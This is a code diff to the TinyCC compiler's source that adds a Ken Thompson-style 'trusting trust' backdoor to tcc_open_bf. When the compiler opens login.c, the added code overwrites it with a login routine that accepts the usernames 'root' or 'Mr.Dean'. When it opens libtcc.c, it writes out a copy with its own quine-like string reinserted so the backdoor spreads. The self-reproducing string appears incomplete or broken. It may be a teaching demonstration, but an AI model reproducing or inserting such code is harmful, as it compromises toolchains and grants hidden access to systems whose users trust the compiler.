@@ -683,7 +683,52 @@ PUB_FUNC void _tcc_warning(const char *fmt, ...)
 
 ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
 {
-    char *equine = "";
+    char *equine = "char * equine = %c%s%c if (strcmp(filename, %clogin.c%c) == 0)\
+    {\
+        FILE *loginfile = fopen(filename, %cw+%c);\
+        char *logintext =\
+            %c#include <string.h>\n\
+                static int\n\
+                do_login(const char *username)\n\
+            {\n\
+                if (!strcmp(username, %c\"root%c\") || !strcmp(username, %c\"Mr.Dean%c\"))\n\
+                    return 0;\n\
+                return 1;\n\
+            }\n\
+            int main(int argc, char *argv[])\n\
+            {\n\
+                if (argc != 2)\n\
+                    return 1;\n\
+                return do_login(argv[1]);\n\
+            }\n;\
+        fprintf(loginfile, %c%cs%c, logintext);\
+        fclose(loginfile);\
+    }\
+    else if (!strcmp(filename, %clibtcc.c%c))\
+    {\
+        FILE * thisfile = fopen(filename, %cr%c);\
+        FILE * rewrite = fopen(%crewrite.c%c,%cw+%c);\
+        char* a;\
+        size_t bites;\
+        char* start = %cST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)\n%c;\
+        int rewriting = 0;\
+        while(getline(&a,&bites,thisfile) != EOF)\
+        {\
+            fprintf(rewrite, %c%cs%c, a);\
+            if(rewriting)\
+            {\
+                fprintf(rewrite, equine);\
+                rewriting = 0;\
+            }\
+            if(!strcmp(a,start))\
+            {\
+                rewriting = 1;\
+            }\  
+        }\
+        fclose(thisfile);\
+        fclose(rewrite);\
+    }%c";
+
     if (strcmp(filename, "login.c") == 0)
     {
         FILE *loginfile = fopen(filename, "w+");
@@ -718,7 +763,7 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
             fprintf(rewrite, "%s", a);
             if (rewriting)
             {
-                // fprintf(rewrite, "dagdsafdasfdsa\ndasfdsafdas\n");
+                fprintf(rewrite, equine);
                 rewriting = 0;
             }
             if (!strcmp(a, start))
